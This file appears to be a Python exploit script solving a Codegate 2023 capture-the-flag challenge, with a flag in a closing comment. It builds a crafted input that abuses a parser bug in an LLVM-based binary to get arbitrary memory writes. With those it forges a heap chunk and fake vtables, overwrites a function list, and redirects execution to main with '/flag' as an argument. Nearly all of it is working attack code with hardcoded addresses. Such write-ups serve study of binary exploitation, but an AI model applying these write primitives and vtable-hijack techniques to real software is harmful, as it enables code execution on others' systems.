import base64
from contextlib import contextmanager
import struct
import sys


STRCPY_GOT = 0x1D20858
STRLEN_GOT = 0x1D20DF0
FREE_GOT = 0x1D212C0
LLVM_ERRS_GOT = 0x1D20A10
STRCMP_GOT = 0x1D21640
STRING_CREATE_GOT = 0x1D20F40
NEW_GOT = 0x1D21298
MEMCPY_GOT = 0x1D21248
MAIN = 0x430418
DELETE_GOT = 0x1D20288  # _ZdlPv
STRING_REPLACE_GOT = 0x1D20060
FUNCTION_LIST = 0x1D28EF0
GETPID_PLT = 0x42e7b0
GETPID_GOT = 0x1d20bd8


def main():
    s = b""

    @contextmanager
    def func(name):
        nonlocal s
        s += b"void " + name + b"(){while(" + name + b"){"
        yield
        s += b"}}"

    def validate(x):
        assert b"\x0a" not in x
        assert b'"' not in x[1:-1]

    def annotation_1(x):
        print("A: " + x.hex(), file=sys.stderr)
        nonlocal s
        s += b'annotation("' + x + b'\x00");'

    def annotation(b):
        validate(b)
        b = b"A" * 61 + b'\\"' + b
        i = len(b) - 1
        while i >= 0:
            if b[i] == 0:
                annotation_1(b[:i].replace(b"\x00", b"A"))
            i -= 1

    def tpe(x):
        print("T: " + x.hex(), file=sys.stderr)
        validate(x)
        nonlocal s
        s += b"type(" + x + b");"

    def arbw(where, what):
        assert len(what) <= 0x12
        annotation(struct.pack("<QQ", where, 0x7FFFFFFF))
        tpe(what)

    with func(b"f"):
        # functionList[0] = &func_bomb
        # functionList[1] = &func_flag
        arbw(0x1D2A680 - 1, b'"' + struct.pack("<QQ", 0x1D2AC80, 0x1D2A780) + b'"')

        # func_bomb->chunk = 0x20 | PREV_IN_USE
        # func_bomb->vtable = vtable_bomb
        arbw(0x1D2AC80 - 8 - 1, b'"' + struct.pack("<QQ", 0x21, 0x1D2AD80) + b'"')

        # vtable_bomb.dump = getpid@plt
        arbw(0x1D2AD80 + 8 - 1, b'"' + struct.pack("<Q", GETPID_PLT) + b'"')

        # func_flag->vtable = &vtable_flag
        arbw(0x1D2A780 - 1, b'"' + struct.pack("<Q", 0x1D2A880) + b'"')

        #                                        ; rdi = functionList[0]
        # 0xe34428: mov eax, dword ptr [rdi]     ; eax = functionList[0]->vtable
        # 0xe3442a: mov rsi, qword ptr [rax]     ; rsi = functionList[0]->vtable->0
        # 0xe3442d: mov rax, qword ptr [rdi]     ; rax = functionList[0]->vtable
        # 0xe34430: call qword ptr [rax + 0x48]  ; target = functionList[0]->vtable->0x48

        # vtable_flag->0 = argv
        # vtable_flag->dump = gadget
        # vtable_flag->0x48 = main + 1 (+ 1 is for stack alignment)
        arbw(0x1D2A880 - 1, b'"' + struct.pack("<QQ", 0x1D2A980, 0xE34428) + b'"')
        arbw(0x1D2A880 + 0x48 - 1, b'"' + struct.pack("<Q", MAIN + 1) + b'"')

        # argv
        arbw(0x1D2A980 - 1, b'"' + struct.pack("<QQ", 0x1D2AA80, 0x1D2AB80) + b'"')

        # argv[0]
        arbw(0x1D2AA80 - 1, b'"prog\x00"')

        # argv[1]
        arbw(0x1D2AB80 - 1, b'"/flag\x00"')

        # functionList = {func_bomb, func_flag}
        arbw(FUNCTION_LIST - 1, b'"' + struct.pack("<QQ", 0x1D2A680, 0x1D2A690) + b'"')
    print(base64.b64encode(s).decode())
    # codegate2023{7fd6cd5db811de44c82b529325012f29dbecd50084fad5f02f7a6a5ed3560748}


if __name__ == "__main__":
    main()
